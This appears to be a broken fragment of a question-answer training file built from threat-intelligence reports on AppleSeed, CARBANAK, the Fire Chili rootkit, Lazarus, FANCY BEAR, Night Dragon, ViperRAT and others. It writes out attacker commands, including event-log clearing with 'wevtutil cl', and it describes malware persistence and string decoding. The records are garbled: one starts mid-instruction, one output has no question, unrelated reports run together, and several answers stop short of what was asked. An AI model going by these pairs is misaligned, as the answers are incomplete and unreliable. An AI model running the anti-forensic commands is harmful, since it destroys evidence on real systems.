examined to confirm the developer's intention. However, as the discussed sample's info-stealing feature is disabled,\nanother sample with the feature will be analyzed for the section explaining such feature. As all of the samples use the HTTP protocol, AppleSeed sample that communicates with the C&C server via email will be discussed.\n- Only has default features: 739d14336826d078c40c9580e3396d15\n- Possesses additional info-stealing feature: 2cb77491573acc5e8198d8cf68300106\n- Communicates with C&C via email: dacb71c5eac21b41bb8077fe2e9f5a25\nSmall Headline: 3.1.1. Initial Routine\nUpon execution, AppleSeed first goes through API Resolving in the initialization routine. The names of the API functions that will find the URL are all encoded, and these encoded strings are a trait of AppleSeed. Besides API functions, AppleSeed harbors most of the strings, such as C&C URL and User-Agent, in encoded forms as shown in Figure 25.\nThe original version of the string that is decoded first (\"9d99c9fe01bc57d39df2546955a7021a9fe6567457fb001a9dad543755e70258\") is \"kernel32.dll.\" The string is mainly divided into two parts. The first 16 characters are used as a key for Xor encryption, and the part after the initial 16 characters is the original string that is encrypted and saved.\n- Xor Key: 9d99 c9fe 01bc 57d3\n- Encoded String (Xor Key): 9df2 5469 55a7 021a 9fe6 5674 57fb 001a 9dad 5437 55e7 0258\nNote that the Xor encoding method used is not a simple one; the following encrypted strings are simultaneously used for the next Xor encoding.\n( 0xc9fe xor 0x9dad ) xor 0x5437 = 0x0064 = \"d\"\n( 0x01bc xor 0x5437 ) xor 0x55e7 = 0x006c = \"l\"\n( 0x57d3 xor 0x55e7 ) xor 0x0258 = 0x006c = \"l\"\nAfter API Resolving, the malware finds the settings data. The data is encoded with the same algorithm that was mentioned above. The data found includes the host and path of the C&C server, path to install the DLL file, prefix that will be used as PCID, etc. The following is the settings data decoded from the current analysis target sample.\nSmall Headline: 3.1.2. Installation\nAppleSeed, which is a DLL format, is executed by regsvr32.exe. One of its characteristics is that it is always installed on a certain path. The installation path is usually inside %ALLUSERSPROFILE% (ProgramData), but some samples are installed inside %APPDATA%.\nThe current analysis target sample is installed in %ALLUSERSPROFILE% with the exact path being \"Software\\Microsoft\\Windows\\Defender\" (extracted from the settings data shown in Table 4). The name of the installer is AutoUpdate.dll. It copies itself to create a batch file in the %ALLUSERSPROFILE%\\temp\\ path with the original being deleted after. The path is later registered to the auto-run registry Run key with the name \"WindowsDefenderAutoUpdate\" to allow the file to be executed upon reboot.\nThe malware then uses a mutex to check the concurrent execution. The mutex used by the current analysis sample is \"DropperRegsvr32-20210504113516.\" As the Export DLL Name is \"dropperregsvr32(x86).dll\" and the DLL has a similar TimeStamp with the date information shown in the mutex name which appears to represent the malware's name that was decided during the development and its creation date.\nVery\n\nAnswer this question based on the above context: Describe the initial routine and installation process of the AppleSeed backdoor, including how it achieves persistence.",
    "output": "Upon execution, AppleSeed goes through API Resolving in the initialization routine, where the names of the API functions and other strings like C&C URL and User-Agent are encoded. The malware decodes these strings using an Xor encryption method. After API Resolving, AppleSeed finds and decodes settings data, which includes the C&C server details and installation paths.

    "instruction": "Big Headline: Operators' Access To Source Code\nLet's look at two more related deductions from our blog post:\n\"Based upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to modify it or have a close relationship to the developer(s).\"\n\"Some of the operators may be compiling their own builds of the backdoor independently.\"\nThe first deduction was based on the following evidence:\n\"Despite the likelihood of a build tool, we have found 57 unique compile times in our sample set, with some of the compile times being quite close in proximity. For example, on May 20, 2014, two builds were compiled approximately four hours apart and were configured to use the same C2 servers. Again, on July 30, 2015, two builds were compiled approximately 12 hours apart.\"\nTo investigate further, we performed a diff of two CARBANAK samples with very close compile times to see what, if anything, was changed in the code. Figure 6 shows one such difference.\nThe POSLogMonitorThread function is only executed in Sample A, while the blizkoThread function is only executed in Sample B (Blizko is a Russian funds transfer service, similar to PayPal). The POSLogMonitorThread function monitors for changes made to log files for specific point of sale software and sends parsed data to the C2 server. The blizkoThread function determines whether the user of the computer is a Blizko customer by searching for specific values in the registry. With knowledge of these slight differences, we searched the source code and discovered once again that preprocessor parameters were put to use. Figure 7 shows how this function will change depending on which of three compile-time parameters are enabled.\nThis is not definitive proof that operators had access to the source code, but it certainly makes it much more plausible. The operators would not need to have any programming knowledge in order to fine tune their builds to meet their needs for specific targets, just simple guidance on how to add and remove preprocessor parameters in Visual Studio.\nEvidence for the second deduction was found by looking at the binary C2 protocol implementation and how it has evolved over time. From our previous blog post:\n\"This protocol has undergone several changes over the years, each version building upon the previous version in some way. These changes were likely introduced to render existing network signatures ineffective and to make signature creation more difficult.\"\nFive versions of the binary C2 protocol were discovered amongst our sample set, as shown in Figure 8. This figure shows the first noted compile time that each protocol version was found amongst our sample set. Each new version improved the security and complexity of the protocol.\nIf the CARBANAK project was centrally located and only the template binaries were delivered to the operators, it would be expected that sample compile times should fall in line with the evolution of the binary protocol. Except for one sample that implements what we call \"version 3\" of the protocol, this is how our timeline looks. A probable explanation for the date not lining up for version 3 is that our sample set was not wide enough to include the first sample of this version. This is not the only case we found of an outdated protocol being implemented in a sample; Figure 9 shows another example of this.\nIn this example, a CARBANAK sample found in the wild was using protocol version 4 when a newer version had already been available for at least two months. This would not be likely to occur if the source code were kept in a single, central location. The rapid-fire fine tuning of template binaries using preprocessor parameters, combined with several samples of CARBANAK in the wild implementing outdated versions of the protocol indicate that the CARBANAK project is distributed to operators and not kept centrally.\nBig Headline: Names of Previously Unidentified Commands\nThe source code revealed the names of commands whose names were previously unidentified. In fact, it also revealed commands that were altogether absent from the samples we previously blogged about because the functionality was disabled. Table 1 shows the commands whose names were newly discovered in the CARBANAK source code, along with a summary of our analysis from the blog post.\nThe msgbox command was commented out altogether in the CARBANAK source code, and is strictly for debugging, so it never appeared in public analyses. Likewise, the ifobs command did not appear in the samples we analyzed and publicly documented, but likely for a different reason. The source code in Figure 10 shows the table of commands that CARBANAK understands, and the ifobs command (0x6FD593) is surrounded by an #ifdef, preventing the ifobs code from being compiled into the backdoor unless the ON_IFOBS preprocessor parameter is enabled.\nOne of the more interesting commands, however, is tinymet, because it illustrates how source code can be both helpful and misleading.\nBig Headline: The tinymet Command and Associated Payload\nAt the time of our initial CARBANAK analysis, we indicated that command 0xB0603B4 (whose name was unknown at the time) could execute shellcode. The source code reveals that the command (whose actual name is tinymet) was intended to execute a very specific piece of shellcode. Figure 12 shows an abbreviated listing of the code for handling the tinymet command, with line numbers in yellow and selected lines hidden (in gray) to show the code in a more compact format.\nThe comment starting on line 1672 indicates:\ntinymet command\nCommand format: tinymet {ip:port | plugin_name} [plugin_name] Retrieve meterpreter from specified address and launch in memory\nOn line 1710, the tinymet command handler uses the single-byte XOR key 0x50 to decode the shellcode. Of note, on line 1734 the command handler allocates five extra bytes and line 1739 hard-codes a five-byte mov instruction into that space. It populates the 32-bit immediate operand of the mov instruction with the socket handle number for the server connection that it retrieved the shellcode from. The implied destination operand for this mov instruction is the edi register.\nOur analysis of the tinymet command ended here, until the binary file named met.plug was discovered. The hex dump in Figure 12 shows the end of this file.\nThe end of the file is misaligned by five missing bytes, corresponding to the dynamically assembled mov edi preamble in the tasking source code. However, the single-byte XOR key 0x50 that was found in the source code did not succeed in decoding this file. After some confusion and further analysis, it was realized that the first 27 bytes of this file are a shellcode decoder that looked very similar to . Figure 13 shows the shellcode decoder and the beginning of the encoded metsrv.dll. The XOR key the shellcode uses is 0xEF47A2D0 which fits with how the five-byte mov edi instruction, decoder, and adjacent metsrv.dll will be laid out in memory.\nDecoding yielded a copy of metsrv.dll starting at offset 0x1b. When shellcode execution exits the decoder loop, it executes Metasploit's .\nIronically, possessing source code biased our binary analysis in the wrong direction, suggesting a single-byte XOR key when really there was a 27-byte decoder preamble using a four-byte XOR key. Furthermore, the name of the command being tinymet suggested that the was involved. This may have been the case at one point, but the source code comments and binary files suggest that the developers and operators have moved on to simply downloading Meterpreter directly without changing the name of the command.\nBig Headline: Conclusion\nHaving access to the source code and toolset for CARBANAK provided us with a unique opportunity to revisit our previous analysis. We were able to fill in some missing analysis and context, validate our deductions in some cases, and provide further evidence in other\ncases, strengthening our confidence in them but not completely proving them true. This exercise proves that even without access to the source code, with a large enough sample set and enough analysis, accurate deductions can be reached that go beyond the source code. It also illustrates, such as in the case of the tinymet command, that sometimes, without the proper context, you simply cannot see the full and clear purpose of a given piece of code. But some source code is also inconsistent with the accompanying binaries. If Bruce Lee had been a malware analyst, he might have said that source code is like a finger pointing away to the moon; don't concentrate on the finger, or you will miss all that binary ground truth. Source code can provide immensely rich context, but analysts must be cautious not to misapply that context to binary or forensic artifacts.\nIn the , we share details on an interesting tool that is part of the CARBANAK kit: a video player designed to play back desktop recordings captured by the backdoor.\n\nAnswer this question based on the above context: What insights does the tinymet command provide about the relationship between source code analysis and binary artifacts in the context of CARBANAK?",
    "output": "The tinymet command illustrates the complexities and potential pitfalls of relying solely on source code for analysis. Initially, the source code suggested that tinymet was designed to execute a specific piece of shellcode using a single-byte XOR key. However, further analysis revealed that the actual shellcode used a 27-byte decoder preamble with a four-byte XOR key. This discrepancy highlights that while source code can provide valuable context, it must be carefully correlated with binary artifacts to avoid misinterpretation. Analysts should not solely rely on the source code but also consider the actual behavior and structure of the binaries.",

    "instruction": "Medium Headline: Network Connections\nThe rootkit is capable of hiding TCP connections from tools such as netstat. Much of the code for this part seems to be copied from an open-source (<https://github.com/bowlofstew/rootkit.com/blob/master/cardmagic/PortHidDemo_Vista.c>)project.\nThe rootkit attaches to nsiproxy.sys's device stack and intercepts IOCTLs of type IOCTL_NSI_GETALLPARAM (0x12000B) that are sent to it. This IOCTL is used to retrieve information about the active network connections on the system. When it is intercepted, the driver replaces the IoCompletion routine with a function that filters the results to hide its own network connections.\nIOCTL_NSI_GETALLPARAM returns the information about network connections in an NSI_PARAM structure. NSI_PARAM contains connection data such as IP, port, connection state, and process IDs of the executables in charge of creating the connection. The filter function iterates this structure, searching for connections involving a process or port number from its global network list. All identified connections are removed from the structure, rendering them hidden from the process that sent the IOCTL. It is interesting to note that the newer build of the 64-bit rootkit added support to filter IOCTLs from 32-bit processes as well.\nIf attaching to nsiproxy.sys fails, the rootkit attaches to \\Device\\Tcp instead, intercepting IOCTL_TCP_QUERY_INFORMATION_EX (0x120003) and hiding network connections in a similar manner.\nBy default, the global network list is initialized with the following process paths:\n*\\SYN.EXE\n*\\SVCHOST.EXE\nAs a result, TCP connections of all services running under svchost.exe are hidden, not just the ones of the Milestone backdoor.\nBig Headline: Attribution\nThe Milestone backdoor is actually the same Infoadmin RAT that was used by Deep Panda back in the early 2010s, referenced in blogs from (<https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2014/AdversaryIntelligenceReport_DeepPanda_0%20%281%29.pdf>)2013 and (<https://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf>)2015. Although many backdoors are based on Gh0st RAT code, Milestone and Infoadmin are distinguishable from the rest. Besides having profoundly similar code, both backdoors incorporate identical modifications of Gh0st RAT code not seen in other variants.\nBoth backdoors share a XOR encryption function for encrypting communication and have abandoned the zlib compression of the original Gh0st RAT. Both also modified Gh0st RAT code in an identical way, specifically the CMD and screen capture functions. Moreover, the backdoors share two commands that are not present in other Gh0st RAT variants: the session enumeration command and the command to execute as an administrative user.\nAdditional evidence indicates affiliation to Winnti. The rootkits are digitally signed with certificates stolen from game development companies, which is a known characteristic of Winnti. Searching for more files signed with one of the certificates led to a malicious DLL uploaded to VirusTotal with the name winmm.dll. Further examination revealed it as the same tool referenced in a blog about Winnti that was published in (<https://securelist.com/winnti-1-0-technical-analysis/37002/>)2013. Yet another connection to Winnti is based on a C2 domain. Two of the newdev.dll loaders are configured with the server gnisoft[.]com, which was attributed to Winnti in .\nBig Headline: Conclusion\nIn this blog, we have attributed a series of opportunistic Log4Shell infections from the past month to Deep Panda. Though previous technical publications on Deep Panda were published more than half a decade ago, this blog also relates to a more recent (<https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?menu_dist=2&seq=29904>)report about the Milestone backdoor, which shows that their operations have continued throughout all these years.\nFurthermore, we introduced the previously unknown Fire Chili rootkit and two compromised digital signatures, one of which we also directly linked to Winnti. Although both Deep Panda and Winnti are known to use rootkits as part of their toolset, Fire Chili is a novel strain with a unique code base different from the ones previously affiliated with the groups.\nThe reason these tools are linked to two different groups is unclear at this time. It's possible that the groups' developers shared resources, such as stolen certificates and C2 infrastructure, with each other. This may explain why the samples were only signed several hours after being compiled.\nBig Headline: Fortinet Solutions\nFortiEDR detects and blocks these threats out-of-the-box without any prior knowledge or special configuration.

The vulnerability affects IE6 through IE11, but the attack is targeting IE9 through IE11. This zero-day bypasses both ASLR and DEP. Microsoft has assigned CVE-2014-1776 to the vulnerability and released (<https://technet.microsoft.com/en-US/library/security/2963983>)security advisory to track this issue.\nThreat actors are actively using this exploit in an ongoing campaign which we have named \"Operation Clandestine Fox.\" However, for many reasons, we will not provide campaign details. But we believe this is a significant zero day as the vulnerable versions represent about a quarter of the total browser market. We recommend applying a patch once available.\nAccording to (<http://www.netmarketshare.com/browser-market-share.aspx?qprid=2&qpcustomd=0&qpsp=168&qpnp=12&qptimeframe=M>)NetMarket Share, the market share for the targeted versions of IE in 2013 were:\nCollectively, in 2013, the vulnerable versions of IE accounted for 26.25% of the browser market. The vulnerability, however, does appear in IE6 through IE11 though the exploit targets IE9 and higher.\n\nBased on the above text, answer a question. Why did FireEye Research Labs consider the zero-day exploit identified in Operation Clandestine Fox to be significant, and what specific mitigation steps did they recommend?",
    "output": "FireEye Research Labs considered the zero-day exploit identified in Operation Clandestine Fox to be significant because it affected a broad range of Internet Explorer versions (IE6 through IE11), with the exploit specifically targeting IE9 through IE11. These versions collectively represented about 26.25% of the total browser market in 2013, making the vulnerability highly impactful. Additionally, the exploit was capable of bypassing both Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP), which are critical security measures. Given the widespread use of these browser versions and the sophistication of the exploit, FireEye recommended applying a patch as soon as one became available to mitigate the risk.",

    "instruction": "Medium Headline: 3.4  Links to Previous Reporting\nSome of the malware variants identified during Operation Blockbuster have been correlated to previously reported incidents and attacks, either because the malware was specifically identified in the attack, the Lazarus Group malware shared notable code overlap with the publicly reported malware, or the C2 infrastructure publicly reported was also found hard coded in malicious tools used by the Lazarus Group. Additionally, several events also had TTPs highly similar to those of the Lazarus Group and have been linked to other notable attacks by security researchers. While some of these indicators, such as overlapping C2s or some TTPs, may not be definitive proof of a linked activity, the collective picture of these events together provide a stronger link.\nThese ties strongly suggest that the Lazarus Group has been active since at least 2009, and potentially as far back as 2007, or has extensively shared resources with other closely linked groups responsible for these attacks. In the scenario that the GOP were a real organization and responsible for the SPE attack, this would suggest that SPE was not the only operation by the hacktivist group. However, Novetta's analysis and findings suggest that the SPE attack was one of several attacks attributable to the Lazarus Group, who may have posed as the pop up hacktivist collective to mislead or distract the public.\nThe Lazarus Group Timeline\nVarious security researchers have connected multi-staged attacks over a period of several years, largely against South Korean targets. Attack methods used include hard disk wiping and DDoS attacks that triggered on historically significant dates, overwriting disk content with political strings, using legitimate third-party update mechanisms to move across target networks, specific encryption and obfuscation methods, and using similar C2 structures across campaigns. We have been able to directly link several of these attacks to the Lazarus Group.\nOperation Flame and Operation 1Mission: 2007 \u2013 2012\nIssueMakersLab researchers have connected malicious activity as recent as the March 2013 DarkSeoul wiper attack to activity as far back as 2007,36 as the attackers used the same passwords, RSA encryption keys, and C2 protocol across attacks.37 Since 2012, these attackers have reportedly carried out activities under the name \"Operation 1Mission,\" based on a PDB path found in a plurality of the malware linked to identified attack activity.\nThe group behind Operation 1Mission used legitimate third-party software (an ActiveX vulnerability) as an initial infection vector, shared public RSA key across malware variants for six years, exfiltrated data and downloaded additional malware using Stage 1 C2 servers using the same primary C2 protocol and C2 code, and distributed destructive malware via Stage 2 C2 servers using altered antivirus update files. The Operation 1Mission TTPs have been reflected in multiple reported events listed in this section as well as in the Lazarus Group's malware: although we cannot confirm a link to the malware used in Operation 1Mission, Novetta has also observed shared public RSA keys across malware families, shared C2 infrastructure between unrelated families, and Stage 1 C2 servers used to distribute and download additional malware tools.\nIssueMakerLabs' analysis linking DarkSeoul to malicious activity from 2007 has also been supported by Fortinet research, which connected cyber activity from 2007, dubbed Operation Flame,38 to Operation 1Mission, Operation Troy, and the DarkSeoul attack. While the earliest compilation date for Lazarus Group malware identified by Novetta during this Operation is 2009, Novetta has directly linked Lazarus Group tools to Operation Troy and at least two other attacks that\n34  \"South Korea Detects Suspected North Korea Hacking Attempt.\" Security Week.

In theory, the additional modules can do virtually anything on the victim system. The encryption keys in the script were different on every system. Powershell version of credential theft tool MimiKatz was also used by the actors to facilitate credential acquisition for lateral movement purposes.\nFANCY BEAR adversary used different tradecraft, deploying X-Agent malware with capabilities to do remote command execution, file transmission and keylogging. It was executed via rundll32 commands such as:\nrundll32.exe \"C:\\Windows\\twain_64.dll\"\nIn addition, FANCY BEAR's X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute remote commands. Both tools were deployed via RemCOM, an open-source replacement for PsExec available from GitHub. They also engaged in a number of anti-forensic analysis measures, such as periodic event log clearing (via wevtutil cl System and wevtutil cl Securitycommands) and resetting timestamps of files.\nIntelligence collection directed by nation state actors against US political targets provides invaluable insight into the requirements directed upon those actors. Regardless of the agency or unit tasked with this collection, the upcoming US election, and the associated candidates and parties are of critical interest to both hostile and friendly nation states. The 2016 presidential election has the world's attention, and leaders of other states are anxiously watching and planning for possible outcomes. Attacks against electoral candidates and the parties they represent are likely to continue up until the election in November.\nIndicators of Compromise:\n\nBased on the above text, answer a question. What are the key differences in the tradecraft employed by FANCY BEAR compared to COZY BEAR, and how do these differences impact the detection and mitigation strategies?",
    "output": "FANCY BEAR employs different tradecraft compared to COZY BEAR. FANCY BEAR uses the X-Agent malware, which has capabilities for remote command execution, file transmission, and keylogging. It is executed via `rundll32` commands and utilizes the X-Tunnel tool for network tunneling, facilitating connections to NAT-ed environments. Additionally, FANCY BEAR deploys these tools using RemCOM, an open-source replacement for PsExec. They also engage in anti-forensic measures such as clearing event logs and resetting file timestamps. In contrast, COZY BEAR relies on PowerShell scripts and WMI for persistence. The differences in tradecraft impact detection and mitigation strategies by requiring defenders to monitor for different types of activities and tools. For example, defenders need to look for unusual `rundll32` commands, network tunneling activity, and the use of RemCOM, in addition to PowerShell scripts and WMI events.",

    "output": "The digital certificates associated with the Sunshop campaign primarily use the 'sha1WithRSAEncryption' signature algorithm, with one instance using 'md5WithRSAEncryption'. Both SHA-1 and MD5 are considered weak by modern cryptographic standards due to their susceptibility to collision attacks. This means that attackers could potentially generate valid signatures without possessing the private key, undermining the integrity of the certificates. Cybersecurity experts can address these vulnerabilities by enforcing the use of stronger hash functions, such as SHA-256 or SHA-3, and ensuring that all systems and applications reject certificates signed with outdated algorithms. Regular audits and updates to cryptographic policies are essential to maintain robust security postures.",

    "instruction": "Big Headline: CONCLUSIONS\nPatchwork is a highly successful targeted attack operation, infecting approximately 2,500 high-value targets worldwide. It is surprising that it has remained undetected since its operations began in December, as it seems to have been built out of a confluence of code taken from various public and hidden criminal forums, as well as various open source projects.\nWhat makes this disclosure special is the use of Cymmetria's cyber deception platform19 to catch the threat actor, capturing their second stage toolset and lateral movement activity. Without deception, capturing second-stage tools and activity has previously been difficult (to say the least).\nThe high degree of operational capacity stands in stark contradiction to the low technical ability displayed, which raises the question of whether the copy-paste nature of the threat was potentially intentional, perhaps an evolution of threat actors attempting to avoid the high cost of losing their expensive tool box and malware when they are eventually publically disclosed. This, however, seems unlikely, as the use of such second-hand code is consistent with their second stage toolset meant for persistence, which should typically be built to resist detection.\nWhile one can almost never be conclusive in attribution, based on the information we have it is plausible that the threat actor is a pro-Indian one. As our CEO Gadi Evron said in an internal discussion, \"There is a possibility that another threat actor wanted to look like India and built a false flag operation to fit, but there is zero evidence to support that claim, and it feels like we're reaching just to attack our own argument.\"\nUnlike other APT threat actors, India seems to be a relatively quiet locale for cyber espionage activity, if indeed this is a pro-Indian threat actor, it is noteworthy by itself. The scope and scale of this operation are quite surprising considering the low technical capability displayed, which we believe is a growing trend seen among disparate threat actors.\n19 Cymmetria's MazeRunner\n\nQ: Why was Patchwork, despite its low technical sophistication, able to successfully infect approximately 2,500 high-value targets worldwide without being detected for several months?

    "instruction": "Big Headline: Anatomy of a Hack\nThe Night Dragon attacks work by methodical and progressive intrusions into the targeted infrastructure. The following basic activities were performed by the Night Dragon operation:\n\u2022 Company extranet web servers compromised through SQL-injection techniques, allowing remote command execution\n\u2022 Commonly available hacker tools are uploaded on compromised web servers, allowing attackers to pivot into the company's intranet and giving them access to sensitive desktops and servers internally\n\u2022 Using password cracking and pass-the-hash tools, attackers gain additional usernames and passwords, allowing them to obtain further authenticated access to sensitive internal desktops and servers\n\u2022 Initially using the company's compromised web servers as command and control (C&C) servers, the attackers discovered that they needed only to disable Microsoft Internet Explorer (IE) proxy settings to allow direct communication from infected machines to the Internet\n\u2022 Using the RAT malware, they proceeded to connect to other machines (targeting executives) and exfiltrating email archives and other sensitive documents\nBig Headline: Details of the Attack\nAttackers using several locations in China have leveraged C&C servers on purchased hosted services in the United States and compromised servers in the Netherlands to wage attacks against global oil, gas, and petrochemical companies, as well as individuals and executives in Kazakhstan, Taiwan, Greece, and the United States to acquire proprietary and highly confidential information. The primary operational technique used by the attackers comprised a variety of hacker tools, including privately developed and customized RAT tools that provided complete remote administration capabilities to the attacker. RATs provide functions similar to Citrix or Microsoft Windows Terminal Services, allowing a remote individual to completely control the affected system.\nTo deploy these tools, attackers first compromised perimeter security controls, through SQL-injection exploits of extranet web servers, as well as targeted spear-phishing attacks of mobile worker laptops, and compromising corporate VPN accounts to penetrate the targeted company's defensive architectures (DMZs and firewalls) and conduct reconnaissance of targeted companies' networked computers.\nMany Chinese hacker websites offer these tools for download, including links to reduh, WebShell, ASPXSpy, and many others, plus exploits and zero-day malware.\nOnce the initial system was compromised, the attackers compromised local administrator accounts and Active Directory administrator (and administrative users) accounts. The attackers often used common Windows utilities, such as SysInternals tools (acquired by Microsoft in 2006)\u2014and other publicly available software, including hacking tools developed in China and widely available on Chinese underground hacker websites\u2014to establish \"backdoors\" through reverse proxies and planted Trojans that allowed the attackers to bypass network and host security policies and settings. Desktop anti-virus and anti-spyware tools were also disabled in some instances\u2014a common technique of targeted attacks.\nBig Headline: Use of remote administration tools\nRemote administration tools (RATs) are commonly used administrative tools that allow hackers (and administrators) to manage victims' computers (or managed systems) and completely control their use and function. A commonly used RAT in the hacker community is Gh0st and its many variants. RAT features often include screen and webcam spying, keystroke logging, mouse control, file/registry, and process management, and, of course, remote command shell capability.\nMcAfee has identified several RATs that have been used to establish a persistent infiltration channel into compromised companies. One of the most prevalent RATs is zwShell, which McAfee has seen in the wild since the spring of 2010 (compiled on 2010-03-17 08:47:00). Written in the Delphi language, zwShell was used by attackers to both build custom variants of the Trojan that they deployed on dozens of machines within each victim company, as well as to control compromised machines that would initiate beacon connections to it on a custom protocol.\nAttackers used zwShell extensively to generate dozens of unique Trojan variants and to control the infected machines and exfiltrate sensitive data directly from them. (See Appendix A for a breakdown of the zwShell.)\nOnce the attackers had complete control of the targeted internal system, they dumped account hashes with gsecdump and used the Cain & Abel tool to crack the hashes to leverage them in targeting ever more sensitive infrastructures.\nFiles of interest focused on operational oil and gas field production systems and financial documents related to field exploration and bidding that were later copied from the compromised hosts or via extranet servers. In some cases, the files were copied to and downloaded from company web servers by the attackers. In certain cases, the attackers collected data from SCADA systems.\nBig Headline: Detection\nThe methods and tools used in these attacks are relatively unsophisticated, as they simply appear to be standard host administration techniques, using standard administrative credentials. This is largely why they are able to evade detection by standard security software and network policies. Since the initial compromises, however, many individual unique signatures have been identified for the Trojan and associated tools by security vendors, including McAfee; yet only through recent analysis and the discovery of common artifacts and evidence correlation have we been able to determine that a dedicated effort has been ongoing for at least two years, and likely as many as four. We can now associate the various signatures to these events.\nThe following artifacts can help to determine whether a company has been compromised:\n\u2022 Host files and/or registry keys\n\u2022 Anti-virus alerts\n\u2022 Network communications\nBig Headline: Host Files and Registry Keys\n*This DLL uses a different C&C application that may be an earlier version of zwShell, analysis continues.\nThe Trojan components are manually copied or delivered through administrative utilities to remote systems. They do not include any worm or self-replicating features, nor can the Trojan \"infect\" other computers. Removing the Trojan components is simply a matter of deleting the related files and registry settings.\nThe Trojan backdoor communicates with the C&C server at the address hard-coded in each DLL. The C&C server cannot modify the backdoor once it is installed; related systems must have the Trojan file removed before a new backdoor DLL can be installed on the system. Thus, if the C&C server address is changed, those servers that have the DLL with previous addresses must be remotely administered by the attacker.\nBig Headline: Anti-virus Alerts\nAnti-virus patterns are defined according to samples submitted by clients or analysts as they are discovered. Some Trojans exhibit characteristics of other types of malware, such as worms or viruses, that have the ability to infect other systems. RATs do not typically include such features, and, because they are defined with unique configurations for custom purposes, they commonly change faster than unique samples can be identified.\nOnly when an entire RAT toolkit is found can we define an anti-virus pattern that is generic enough to detect the RAT regardless of configuration changes. The package necessarily includes the C&C application server, the generator utility for creating droppers, related droppers, and backdoors \u2014 and a sufficient number of each to correlate the toolkit.\nAs mentioned previously, there have been several unique patterns developed from samples submitted to McAfee (as well as to other anti-virus vendors).\nMcAfee recommends that companies review McAfee ePolicy Orchestrator\u00ae (McAfee ePO\u2122) software and anti-virus logs for \"NightDragon\" signature detections to identify related alerts since 2007 and then recover and resubmit these samples for analysis to investigate the related incidents. McAfee can assist with the analysis or provide instructions and tools for internal review.\n\nHow did the Night Dragon attacks methodically compromise the targeted infrastructure, and what specific techniques were used to escalate privileges?",
    "output": "A: The Night Dragon attacks compromised the targeted infrastructure through a series of methodical steps. First, company extranet web servers were compromised using SQL-injection techniques, allowing remote command execution. Then, commonly available hacker tools were uploaded to these servers, enabling attackers to pivot into the company's intranet and access sensitive desktops and servers internally. Password cracking and pass-the-hash tools were used to gain additional usernames and passwords, providing further authenticated access to sensitive internal systems. Initially, the company's compromised web servers were used as command and control (C&C) servers, but the attackers discovered they could disable Microsoft Internet Explorer (IE) proxy settings to allow direct communication from infected machines to the Internet. Using Remote Administration Tools (RATs), they connected to other machines, particularly targeting executives, and exfiltrated email archives and other sensitive documents.",

    "instruction": "Big Headline: The increasing sophistication of surveillanceware\nThe structure of the surveillanceware indicates it is very sophisticated. Analysis indicates there are currently two distinct variants of ViperRAT. The first variant is a \"first stage application,\" that performs basic profiling of a device, and under certain conditions attempts to download and install a much more comprehensive surveillanceware\ncomponent, which is the second variant.\nThe first variant involves social engineering the target into downloading a trojanized app. Previous reports alleged this surveillanceware tool was deployed using 'honey traps' where the actor behind it would reach out to targets via fake social media profiles of young women. After building an initial rapport with targets, the actors behind these social media accounts would instruct victims to install an additional app for easier communication. Specifically, Lookout determined these were trojanized versions of the apps SR Chat and YeeCall Pro. We also uncovered ViperRAT in a billiards game, an Israeli Love Songs player, and a Move To iOS app.\nBig Headline: The second stage\nThe second stage apps contain the surveillanceware capabilities. Lookout uncovered nine secondary payload applications:\n* These apps have not been previously reported and were discovered using data from the Lookout global sensor network, which collects app and device information from over 100 million sensors to provide researchers and customers with a holistic look at the mobile threat ecosystem today.\nNaming additional payload applications as system updates is a clever technique used by malware authors to trick victims into believing a threat isn't present on their device. ViperRAT takes this one step further by using its dropper app to identify an appropriate second stage 'update' that may go unnoticed. For example, if a victim has Viber on their device, it will choose to retrieve the Viber Update second stage. If he doesn't have Viber, the generically-named System Updates app gets downloaded and installed instead.\nBig Headline: What was taken\nThe actors behind ViperRAT seem to be particularly interested in image data. We were able to identify that 8,929 files had been exfiltrated from compromised devices and that the overwhelming majority of these, 97 percent, were highly likely encrypted images taken using the device camera. We also observed automatically generated files on the C2, indicating the actor behind this campaign also issues commands to search for and exfiltrate PDF and Office documents. This should be highly alarming to any government agency or enterprise.\nWe observed legitimate exfiltrated files of the following types of data:\nContact information\nCompressed recorded audio in the Adaptive Multi-Rate (amr) file format\nImages captured from the device camera\nImages stored on both internal device and SDCard storage that are listed in the MediaStore\nDevice geolocation information\nSMS content\nChrome browser search history and bookmarks\nCall log information\nCell tower information\nDevice network metadata; such as phone number, device software version, network country, network operator, SIM country, SIM operator, SIM serial, IMSI, voice mail number, phone type, network type, data state, data activity, call state, SIM state, whether device is roaming, and if SMS is supported.\nStandard browser search history\nStandard browser bookmarks\nDevice handset metadata; such as brand, display, hardware, manufacturer, product, serial, radio version, and SDK.\nMedium Headline: On attribution\nMedia reporting on ViperRAT thus far attributes this surveillanceware tool to Hamas. Israeli media published the first\nreports about the social networking and social engineering aspects of this campaign. However it's unclear whether organizations that later reported on ViperRAT performed their own independent research or simply based their content on the original Israeli report. Hamas is not widely known for having a sophisticated mobile capability, which makes it unlikely they are directly responsible for ViperRAT.\nViperRAT has been operational for quite some time, with what appears to be a test application that surfaced in late 2015. Many of the default strings in this application are in Arabic, including the name. It is unclear whether this means early samples were targeting Arabic speakers or if the developers behind it are fluent in Arabic.\nThis leads us to believe this is another actor.\nQuestion: Explain the two-stage infection process of ViperRAT and how the second stage applications are chosen and disguised to evade detection.",
    "output": "Answer: ViperRAT operates through a two-stage infection process. The first stage involves a trojanized app that performs basic profiling of the device and, under certain conditions, attempts to download and install a more comprehensive surveillanceware component, which is the second stage.

